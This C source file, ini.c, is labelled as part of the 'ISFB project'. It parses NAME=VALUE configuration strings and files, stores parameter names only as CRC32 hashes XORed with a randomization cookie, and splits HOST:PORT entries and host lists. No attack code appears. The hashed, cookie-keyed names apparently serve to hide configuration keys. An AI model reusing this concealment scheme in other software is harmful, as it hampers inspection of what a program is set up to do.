//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: ini.c
// $Revision: 383 $
// $Date: 2014-10-23 18:31:51 +0400 (Чт, 23 окт 2014) $
// description:
//  INI-file management routines.

#include "..\common\main.h"
#include "..\common\memalloc.h"
#include "..\crypto\crypto.h"
#include "ini.h"


//
//	Parses the specified parameter string of type: NAME=VALUE, devided by the specified delimiter.
//	Allocates and fills INI_PARAMETERS sructure, cotaining parameter hashes and pointers to specific values.
//
WINERROR __stdcall IniParseParamString(
	PCHAR	ParamStr,					// parameter string to parse
	CHAR	Delimiter,					// delimiter for the parameters
	PINI_PARAMETERS* ppParameters,		// variable to return pointer to INI_PARAMETERS structure
	BOOL	bCaseSensitive				// specifies how to parse parameter names and values: case sensitive or not
	)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	ULONG	Count = 1;
	PCHAR	cStr, cDelim;
	PINI_PARAMETERS	pParams;

	if (cStr = StrChr(ParamStr, '?'))
		ParamStr = cStr + 1;
	
	if (!bCaseSensitive)
		strupr(ParamStr);
	cStr = ParamStr;

	// Calculating total number of parameters in string
	while(cStr = StrChr(cStr, Delimiter))
	{
		Count += 1;
		cStr += 1;
	}

	// Allocating INI_PARAMETER structure
	if (pParams = AppAlloc(sizeof(INI_PARAMETERS) + Count * sizeof(INI_PARAMETER)))
	{
		PINI_PARAMETER pParam = (PINI_PARAMETER)&pParams->Parameter;

		memset(pParams, 0, (sizeof(INI_PARAMETERS) + Count * sizeof(INI_PARAMETER)));

		pParams->Count = Count;
		do 
		{
			if (cStr = StrChr(ParamStr, Delimiter))
				*cStr = 0;
			if (cDelim = StrChr(ParamStr, '='))
			{
				*cDelim = 0;
				pParam->pValue = cDelim + 1;
			}
			
			pParam->NameHash = Crc32(ParamStr, lstrlen(ParamStr));
			ParamStr = cStr + 1;
			pParam += 1;
		} while(cStr);

		*ppParameters = pParams;
		Status = NO_ERROR;

	}	// if (pParams = AppAlloc(sizeof(INI_PARAMETERS) + Count * sizeof(INI_PARAMETER)))

	return(Status);
}

//
//	Parces the specified file containing parameter strings of type: NAME=VALUE.
//	Each parameter string starts with a new line.
//
WINERROR __stdcall IniParseParamFile(
	PCHAR	pParamStr,				// parameter string to parse
	CHAR	UidDelimeter,			// delimiter for UID of a parameter
	CHAR	ValueDelimiter,			// delimiter for a value
	PINI_PARAMETERS* ppParameters,	// variable to return pointer to INI_PARAMETERS structure
	BOOL	bNameCaseSensitive,		// specifies how to parse parameter names: case sensitive or not
	BOOL	bValueCaseSensitive,	// specifies how to parse parameter values: case sensitive or not
	ULONG	NameCookie				// name randomization cookie to xor a prarameter name hash with it
	)
{
	WINERROR Status = ERROR_NOT_ENOUGH_MEMORY;
	PCHAR	pStr;
	PINI_PARAMETERS	pParams;

	// Allocating INI_PARAMETER structure
	if (pParams = AppAlloc(sizeof(INI_PARAMETERS)))
	{
		memset(pParams, 0, sizeof(INI_PARAMETERS));
	
		do 
		{
			PCHAR	cStr, pUid = NULL, pValue = NULL;

			if ((pStr = StrChr(pParamStr, '\r')) || (pStr = StrChr(pParamStr, '\n')))
			{
				*pStr = 0;
				pStr += 1;
			}

			if (cStr = StrChr(pParamStr, ';'))
				// Skipping commented string
				*cStr = 0;

			pUid = pParamStr;

			if (UidDelimeter && (cStr = StrChr(pParamStr, UidDelimeter)))
			{
				*cStr = 0;
				pParamStr = cStr + 1;

				StrTrim(pUid, " \t");
			}	// if (UidDelimeter && (cStr = StrChr(pParamStr, UidDelimeter)))

			if (ValueDelimiter && (cStr = StrChr(pParamStr, ValueDelimiter)))
			{
				pValue = cStr + 1;
				*cStr = 0;

				StrTrim(pValue, " \t");

				if (!bValueCaseSensitive)
					strupr(pValue);
			}	// if (cStr = StrChr(pParamStr, '='))
			
			if (!bNameCaseSensitive)
				strupr(pParamStr);

			StrTrim(pParamStr, " \t\r\n");

			if (*pParamStr)
			{
				PINI_PARAMETERS pNewParams;
				PINI_PARAMETER pParam;

				if (pNewParams = AppRealloc(pParams, sizeof(INI_PARAMETERS) + (pParams->Count + 1) * sizeof(INI_PARAMETER)))
					pParams = pNewParams;
				else if (pNewParams = AppAlloc(sizeof(INI_PARAMETERS) + (pParams->Count + 1) * sizeof(INI_PARAMETER)))
				{
					memcpy(pNewParams, pParams, sizeof(INI_PARAMETERS) + pParams->Count * sizeof(INI_PARAMETER));
					AppFree(pParams);
					pParams = pNewParams;
				}
				else 
					break;

				pParam = &pParams->Parameter[pParams->Count];
				pParams->Count += 1;

				pParam->NameHash = (Crc32(pParamStr, lstrlen(pParamStr)) ^ NameCookie);
				pParam->pValue = pValue;
				pParam->pUid = pUid;
				pParam->Flags = 0;
			}	// if (*pParamStr)
		} while(pParamStr = pStr);

		if (pParams)
		{
			*ppParameters = pParams;
			Status = NO_ERROR;
		}
	}	// if (pParams = AppAlloc(sizeof(INI_PARAMETERS) + Count * sizeof(INI_PARAMETER)))

	return(Status);
}


//
//	Scans the specified INI_PARAMETERS structure for a parameter with the specified Name hash.
//	Returns pointer to the value of the parameter or NULL if the parameter not found.
//
PCHAR __stdcall IniGetParamValue(
	ULONG	NameHash,				// CRC32 hash of the name to find a value for
	PINI_PARAMETERS	pParameters,	// target parameters
	ULONG	NameCookie
	)
{
	PCHAR	pValue = NULL;
	ULONG	i = 0;

	NameHash ^= NameCookie;

	if (pParameters)
	{
		while(!pValue && i < pParameters->Count)
		{
			if (pParameters->Parameter[i].NameHash == NameHash)
			{
				if (pParameters->Parameter[i].Flags & INIP_OFFSET)
					pValue = (PCHAR)&pParameters->Parameter[i] + pParameters->Parameter[i].oValue;
				else
					pValue = pParameters->Parameter[i].pValue;
			}
			i += 1;
		}	// while(!pValue && i < pParameters->Count)
	}	// if (pParameters)

	return(pValue);
}

//
//	Allocates a memory buffer of the specified MinimumLength and duplicates the specified source string into it.
//	If MinimumLength is larger then a length of the specified source string then unused buffer is filled with zeoroes. 
//
LPTSTR __stdcall IniDupStr(
	LPTSTR	SourceStr,		// a string to duplicate
	ULONG	MinimumLength	// minimum size of the string buffer in chars
	)
{
	LPTSTR	DestStr;
	ULONG	Size = max((lstrlen(SourceStr) + 1) * sizeof(_TCHAR), MinimumLength * sizeof(_TCHAR));

	if (DestStr = AppAlloc(Size))
	{
		memset(DestStr, 0, Size);
		lstrcpy(DestStr, SourceStr);
	}
	
	return(DestStr);
}


//
//	Converts the specified address string of an HOST:PORT format into the SOCKADDR_IN structure.
//
BOOL IniStringToTcpAddress(
	LPTSTR			pIpStr,		// address string of an IP:PORT format
	SOCKADDR_IN*	pAddress,	// pointer to the structure that receives TCP/IP address
	BOOL			bPort		// TRUE if the address has to contain TCP port number
	)
{
	BOOL	Ret = FALSE;
	PCHAR	pStr, pPort;
	struct hostent* pHostEnt;

	WSADATA		WsaData;

	if (!WSAStartup(0x0201, &WsaData))
	{
		memset(pAddress, 0, sizeof(SOCKADDR_IN));
		pAddress->sin_family = AF_INET;

		if (pStr = AppAlloc((ULONG)(_tcslen(pIpStr) + 1) * sizeof(_TCHAR)))
		{
	#ifdef _UNICODE
			wcstombs(pStr, pIpStr, _tcslen(pIpStr) + 1);
	#else
			_tcscpy(pStr, pIpStr);
	#endif

			if (!(pPort = strchr(pStr, ':')))
			{
				if (bPort)
					pPort = pStr;
			}
			else
			{		
				*pPort = 0;
				pPort += 1;
			}

			if (pPort)
				pAddress->sin_port = htons((USHORT)strtoul(pPort, 0, 0));

			if (!(pPort == pStr))
			{
				if (pHostEnt = gethostbyname(pStr))
				{
					pAddress->sin_addr.S_un.S_addr = *(PULONG)(*pHostEnt->h_addr_list);
					Ret = TRUE;
				}
			}
			else
			{
				pAddress->sin_addr.S_un.S_addr = 0;
				if (pAddress->sin_port)
					Ret = TRUE;
			}
			AppFree(pStr);
		}	// if (pStr = AppAlloc((_tcslen(pIpStr) + 1) * sizeof(_TCHAR)))

		WSACleanup();
	}	// if (!WSAStartup(0x0201, &WsaData))

	return(Ret);
}


//
//	Packs whole INI_PARAMETERS structure including all it's data into the single memory buffer.
//	Returns pointer to it and the size of the buffer.
//
WINERROR IniPackParameters(
	PINI_PARAMETERS		pIniParams,	// pointer to source INI_PARAMETERS structure
	PINI_PARAMETERS*	ppIniParams,// receives pointer to the packed structure 	
	PULONG				pSize		// receives size of the packed structure 	
	)
{
	ULONG	i, Size;
	PCHAR	pParams;
	WINERROR Status = NO_ERROR;
	PINI_PARAMETERS	pNewParams;

	Size = sizeof(INI_PARAMETERS);

	for (i=0; i<pIniParams->Count; i++)
		Size += (ULONG)lstrlen(pIniParams->Parameter[i].pValue) * sizeof(_TCHAR) + sizeof(_TCHAR);

	Size += pIniParams->Count * sizeof(INI_PARAMETER);

	if (pNewParams = (PINI_PARAMETERS)AppAlloc(Size))
	{
		pParams = (PCHAR)&pNewParams->Parameter[0] + pIniParams->Count * sizeof(INI_PARAMETER);
		pNewParams->Count = pIniParams->Count;
	
		for (i=0; i<pIniParams->Count; i++)
		{
			pNewParams->Parameter[i].Flags = pIniParams->Parameter[i].Flags | INIP_OFFSET;
			pNewParams->Parameter[i].NameHash = pIniParams->Parameter[i].NameHash;
			pNewParams->Parameter[i].oValue = (ULONG)(pParams - (PCHAR)&pNewParams->Parameter[i]);

			lstrcpy(pParams, pIniParams->Parameter[i].pValue);
			pParams += (ULONG)lstrlen(pIniParams->Parameter[i].pValue) * sizeof(_TCHAR) + sizeof(_TCHAR);
		}

		ASSERT((ULONG)(pParams - (PCHAR)pNewParams) == Size);

		*ppIniParams = pNewParams;
		*pSize = Size;
		
		ASSERT(Status == NO_ERROR);
	}	// if (pNewParams = (PINI_PARAMETERS)AppAlloc(Size))
	else
		Status = ERROR_NOT_ENOUGH_MEMORY;

	return(Status);
}


//
//	Parses array of string with delimiters.
//	Creates array of pointers to those strings.
//
ULONG IniBuildArrayFromString(
	LPTSTR		pString,
	CHAR		Delimiter,
	LPTSTR**	ppArray
	)
{
	ULONG	Count = 1;
	PCHAR	pStr;
	LPTSTR*	pHosts;

	// Calculating maximum number of hosts in the list
	pStr = pString;
	while(pStr = StrChr(pStr, Delimiter))
	{
		pStr += 1;
		Count += 1;
	}

	// Parsing the list of hosts
	if (pHosts = AppAlloc(Count * sizeof(LPTSTR)))
	{
		StrTrim(pString, " \t");
		Count = 0;
		do 
		{
			pStr = StrChr(pString, Delimiter);

			if (pStr)
			{
				*pStr = 0;
				pStr += 1;
				StrTrim(pStr, " \t");
			}

			pHosts[Count] = pString;
			pString = pStr;
			Count += 1;
		} while(pString);

		ASSERT(Count < UCHAR_MAX);

		*ppArray = pHosts;
	}	// if (pHosts = AppAlloc(Count * sizeof(LPTSTR)))
	else
		Count = 0;

	return(Count);
}